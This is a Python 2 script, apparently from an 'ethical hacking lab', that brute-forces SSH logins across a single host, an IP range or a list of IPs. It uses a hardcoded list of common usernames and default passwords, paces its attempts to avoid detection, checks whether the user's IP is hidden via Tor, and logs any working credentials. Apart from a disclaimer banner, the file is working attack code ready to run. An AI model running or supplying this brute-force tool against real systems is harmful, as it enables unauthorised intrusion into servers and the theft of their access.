#!/usr/bin/python

#############################################################
# Script to Brute Force SSH access automatically, thr. TOR  #
# written by redN00ws @ Cleveridge                          #
#############################################################
#                                                           #
#        C l e v e r i d g e - Ethical Hacking Lab          #
#                 (https://cleveridge.org)                  #
#                                                           #
#############################################################
# Contribution from                                         #
#  - none yet                                               #
#############################################################
#                                                           #
version = "V0.04"
build = "013"
#############################################################

import pxssh
import getpass
import glob
import os
import socket
import sys
import time
from datetime import datetime
from urllib import urlopen




#++ FUNCTIONS //#

# func Writelog
def func_writelog(how, logloc, txt): # how: a=append, w=new write
   with open(logloc, how) as mylog:
      mylog.write(txt)


# func ScanHost
def func_scanhost(ip, logloc):
   # Log Scan
   txt = "\n*****************************\nScanning IP : %s" % (ip)
   func_writelog("a", logloc, txt + "\n")
   print txt
   
   # check if SSH-port is open
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   result = sock.connect_ex((ip, 22))
	
   if result == 0: # if SSH-port is open
      txt = "Port 22 (SSH) is accessible."
      func_writelog("a", logloc, txt + "\n")
      print txt
      found = False # default : credentials not found yet
      blocked = False # default : not blocked by victim host
      tried = 0
	   
      for usr in user: # run through all usernames
         if found == True: # if credentials were found with previous combination -> exit
            break
         
         if blocked == True: # if you are blocked by victim -> exit and go to next victim
            break
	      
         for pwd in pswd:  # run through all passwords for each username
            print('* Try %s:%s' % (usr, pwd)),
            time.sleep (500.0 / 1000.0) # slow down to prevent detection
            tried += 1
	         
            try: # try to connect
               s = pxssh.pxssh()
               s.login (hostname, usr, pwd)
               s.sendline ('uptime')   # run a command
               s.prompt()              # match the prompt
               print "@ %s     SUCCESS ***********" % (ip)
               print s.before          # print everything before the prompt.
               txt = '%s:%s @ %s     SUCCESS ************/n%s' % (usr, pwd, ip, s.before)
               func_writelog("a", logloc, txt + "\n")
               found = True
               break
            except Exception as ex: # can't connect with this credentials
               print "failed - "
               response = str(ex)
               print response
               if response == "could not synchronize with original prompt" or response == "could not set shell prompt" :
                  txt = 'Stopped due to Error response'
                  func_writelog('a', logloc, txt + '\n')
                  print txt
                  blocked = True
                  break
               elif response[:17] == "End Of File (EOF)" :
                  txt = 'Stopped due to blocked by victim'
                  func_writelog('a', logloc, txt + '\n')
                  print txt
                  blocked = True
                  break
      
      txt = "Tried " + str(tried) + " combinations"
      func_writelog("a", logloc, txt + "\n")
      print txt
                   	
               	
   else: # if SSH-port is closed
      txt = "Port 22 (SSH) is closed."
      func_writelog("a", logloc, txt + "\n")
      print txt

# func CheckIPrange
def func_checkIPrange(ip_range):
   print 'Checking IP range... ',
   reply = False
   posHyphen = ip_range.find('-')
   if int(posHyphen) > 6 and int(posHyphen) <= 15 :
      ip_first = ip_range[:posHyphen]
      ip_untill = ip_range[posHyphen +1:]
      ip_first_parts = ip_first.split('.')
      if len(ip_first_parts) == 4 :
         try :
            if (int(ip_first_parts[0]) < 257 and int(ip_first_parts[0]) >= 0) and (int(ip_first_parts[1]) < 257 and int(ip_first_parts[1]) >= 0) and (int(ip_first_parts[2]) < 257 and int(ip_first_parts[2]) >= 0) and (int(ip_first_parts[3]) < 257 and int(ip_first_parts[3]) >= 0) and (int(ip_untill) < 257 and int(ip_untill) >= 0):
               reply = True
         except Exception :
            #nothing
            print '.',
   
   print "Done"   
   return reply

# func Create IP list of range
def func_createIPlist(ip_range):
   print 'Creating IP list...',
   posHyphen = ip_range.find('-')
   ip_first = ip_range[:posHyphen]
   ip_untill = ip_range[posHyphen +1:]
   ip_first_parts = ip_first.split('.')
   ip_list = []
	
   for x in range(int(ip_first_parts[3]), int(ip_untill)+1):
      ip_list.append(str(ip_first_parts[0]) + '.' + str(ip_first_parts[1]) + '.' + str(ip_first_parts[2]) + '.' + str(x))
   print 'Done'
   return ip_list

# func Get files from /data directory
def func_getDataFiles():
   data_files = glob.glob("data/*")
   return data_files

# func fill Text with something
def func_fillText(item, times):
   txt = ""
   i = 0
   while i < int(times) :
      txt += str(item)
      i += 1
   return txt 
	
# func Show Data Files to attack
def func_printDataFileOptions(data_files):
   
   # If no files in default directory
   empty = False
   if data_files == False or len(data_files) == 0:
      empty = True
      	
   # Add files to menu options
   i = 1
   ops = {}
   for f in data_files :
      ops[i] = f
      i += 1
	
   # Add default items to menu options
   ops['e'] = "Exit Program"
	
   # Create Menu
   ln = []
   inner_length = 50
   ln.append(" *" + func_fillText("*", inner_length) + "*")
   ln.append(" * " + "Select a file from the data/ directory" + func_fillText(" ", inner_length-38-2) + " *") # inner_length-38-2 = inner_length - text_length - outside spaces
   ln.append(" *" + func_fillText("-", inner_length) + "*")
   
   if empty == True:
      ln.append(" * " + "Data directory is empty" + func_fillText(" ", inner_length-23-2) + " *")
      ln.append(" *" + func_fillText(" ", inner_length) + "*")
   
   for o in ops :
      o_txt = str(o) + " : " + str(ops[o])
   	
      # if text to long for menu
      if len(o_txt) > 45 :
         first = o_txt[:35]
         last = o_txt[-6:]
         o_txt = first + "..." + last
   		
      # file output
      ln.append(" * " + o_txt + func_fillText(" ", inner_length-len(o_txt)-2) + " *")
   	
   ln.append(" *" + func_fillText("*", inner_length) + "*")
	
   txt = "\n"
   for item in ln :
      txt = txt + str(item) + "\n"
	
   # return
   return txt

# func Exit
def func_exit():
   print "Exiting...\n\nThanks for using\nCleveridge SSH Scanner\n\nCleveridge : https://cleveridge.org/nSSH Scanner : https://github.com/Cleveridge/cleveridge-ssh-scanner"





#++ PROGRAM ++#
os.system('clear')
user = ["root", "admin", "sysadmin", "oracle", "webmaster", "pi"]
pswd = ["root", "toor", "admin", "000000", "1111", "111111", "11111111", "123", "123.com", "123123", "123123123", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "1234qwer", "123abc", "123qwe", "123qweasd", "147147", "1q2w3e", "1q2w3e4r", "1q2w3e4r5t", "1q2w3e4r5t6y", "1qaz2wsx", "1qaz2wsx3edc", "1qazxsw2", "abc123", "abc@123", "Admin@123", "P@ssw0rd", "Password1", "a123456", "admin1", "admin123", "admin@123", "adminadmin", "administrator", "changeme", "cisco", "cisco123", "default", "firewall", "letmein", "linux", "oracle", "p@ssw0rd", "passw0rd", "password", "q1w2e3r4", "q1w2e3r4t5", "qwerty", "r00t", "raspberry", "redhat", "root123", "rootpass", "rootroot", "server", "test", "test123", "zaq1xsw2"]

print "************************************************"
print "||            CLEVERIDGE SSH SCANNER          ||"
print "************************************************"
print "||  IMPORTANT:                                ||"
print "||  This tool is for ethical testing purpose  ||"
print "||  only.                                     ||"
print "||  Cleveridge and its owners can't be held   ||"
print "||  responsible for misuse by users.          ||"
print "||  Users have to act as permitted by local   ||"
print "||  law rules.                                ||"
print "************************************************"
print "||     Cleveridge - Ethical Hacking Lab       ||"
print "||               cleveridge.org               ||"
print "************************************************\n"
print "Version %s build %s" % (version, build)










"""
ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
BEGIN:
"""

#-- Creating default log directory
logdir = "log"
if not os.path.exists(logdir):
   os.makedirs(logdir)
   txt = "Directory 'log/' created"
   print txt

""" Every run : create log file """
#-- Creating log file in directory 'log' --#
now = datetime.now()
logfile = str(now.year) + str(now.month) + str(now.day) + str(now.hour) + str(now.minute) + str(now.second) + ".log"
print "Creating log : log/%s" % (logfile),
logloc = logdir + "/" + logfile
with open(logloc, "w") as mylog:
   os.chmod(logloc, 0660)
   mylog.write("Log created by Cleveridge SSH Scanner - " + version + " build " + build + "\n\n")
   print ".... Done"
""" """

#-- Creating default configuration in directory 'cnf' --#
txt = "Checking configuration status"
func_writelog("a", logloc, txt + "\n")
print txt


# if no cnf directory -> Create
cnfdir = "cnf"
if not os.path.exists(cnfdir) :
   os.makedirs(cnfdir)
   txt = "Directory 'cnf/' created"
   func_writelog("a", logloc, txt + "\n")
   print txt
   

# if no user ip file in cnf -> create
file_userip = cnfdir + "/userip.cnf"
if not os.path.exists(file_userip) :
   with open(file_userip, "w") as myuserip :
      os.chmod(file_userip, 0660)
      myuserip.write("1.1.1.1")
      txt = "File 'userip.cnf' created in 'cnf/'"
      func_writelog("a", logloc, txt + "\n")
      print txt
      

# if default file directory not exist -> create
datadir = 'data'
if not os.path.exists(datadir) :
   os.makedirs(datadir)
   txt = "Directory 'data/' created"
   func_writelog("a", logloc, txt + "\n")
   print txt

"""
:END
ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
"""







print " " # to create a better view of the logs on screen


#-- Register date and time of scan --#
txt = "Tool started : %s/%s/%s - %s:%s:%s" % (now.year, now.month, now.day, now.hour, now.minute, now.second)
func_writelog("a", logloc, txt + "\n\n")
print txt
print " "

#-- Verify users IP --#
print "Fill out your machines IP. This is the IP you want to hide!!"
print "If the IP is the same as the default, just hit [Enter]..."
with open(file_userip, 'r') as cont :
   content = cont.read()
   my_ip = raw_input("Your IP [" + content + "] : ") or content
with open(file_userip, 'w') as myuserip : # save new value
   myuserip.write(my_ip[:15]) # save not more then 15 chars
	

#-- Local IP --#
txt = "Local IP : " + [(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
func_writelog("a", logloc, txt + "\n")
print txt

#-- Visible IP --#
try :
   visible_ip = urlopen('https://cleveridge.org/_exchange/open_files/return_ip.php?s=ssh_scan').read()
except Exception :
   visible_ip = urlopen('https://enabledns.com/ip').read()
txt = "Visible IP : " + visible_ip
func_writelog("a", logloc, txt + "\n")
print txt

#-- if private IP is visible
if visible_ip == my_ip: # if your real ip is visible -> Break up 
   txt = "   Your IP is visible !!!\n \n" #   Add 'Socks4 127.0.0.1 9050' to /etc/proxychains.conf.\n   Start Tor service, then \n   proxychains ./cl_ssh_scan.py"
   func_writelog("a", logloc, txt + "\n")
   print txt
   
if True :
   
   # Select Method
   print "\n\n *************************************\n * Select a method :                 *\n *************************************\n * h : Scan one host ip              *\n * r : Scan a range of IP's          *\n * f : Scan IP's from file (one/row) *\n *************************************"
   method = raw_input(' * Method : ')
   txt = "Selected Method : "
   func_writelog("a", logloc, txt)
   print txt,
   
   
   if method == 'h':   
      # Selected Method : (h)ost
      
      txt = "Scan one host IP"
      func_writelog("a", logloc, txt + "\n\n")
      print txt
   	
      hostname = raw_input('Hostname : ')
      func_scanhost(hostname, logloc)
   
   elif method == 'r': 
      # Selected Method : (r)ange
       
      txt = "Scan IP range"
      func_writelog("a", logloc, txt + "\n\n")
      print txt
      
      print "Fill out an IP range like 192.168.0.1-25"
      ip_range = raw_input('IP range : ')
      
      # If IP range is valid > execute      
      if(func_checkIPrange(ip_range) != True): # if not valid
         txt = "IP range not valid !! e.g. 192.168.0.1-25"
         func_writelog("a", logloc, txt + "\n")
         print txt
      else : # if valid ip range
      	
         # log
         txt = "IP range %s is valid" % (ip_range)
         func_writelog("a", logloc, txt + "\n\n")
         print txt
      	
         # creating ip list
         ip_l = func_createIPlist(ip_range)
      	
         # run scan for every ip in range
         for hostname in ip_l:
            func_scanhost(hostname, logloc)
      	
      
   elif method == 'f':
      #Selected Method : (f)ile
       
      txt = "Scan IP's from file"
      func_writelog("a", logloc, txt + "\n\n")
      print txt
      
      d_files = func_getDataFiles()
      txt = func_printDataFileOptions(d_files)
      print txt[:-1] # to remove the last \n
      
      ip_file = raw_input(" * Select : ")
      
      # Get File contents or Exit
      goon = False
      try:
         val = int(ip_file)
         goon = True
         val  = val -1 # because array keys are options -1
      except Exception :
         print 'No file selected'
      
      # if selection is an integer and if selection exists -> execute else exit
      ip_l = []
      if goon == True :
         print d_files[val]
         try :
            fl = open(d_files[val], 'r')
      		
            txt = "Selected File : " + str(d_files[val])
            func_writelog("a", logloc, txt + "\n")
            print txt
      		
            
            for line in fl :
               ip_l.append(line)
               print ' - ' + line
         except Exception :
            print 'Selection not valid'
      else :
         func_exit()
      
      # if ip's in file else exit
      if len(ip_l) > 0 :
         # If valid IP -> run scan
         for hostname in ip_l :
            try :
               socket.inet_aton(hostname)
               func_scanhost(hostname, logloc)
            except socket.error :
               print "Contains an unvalid IP"
      else :
         print "The selected file seems empty"
         func_exit()
   
   else :
      func_exit()
      	
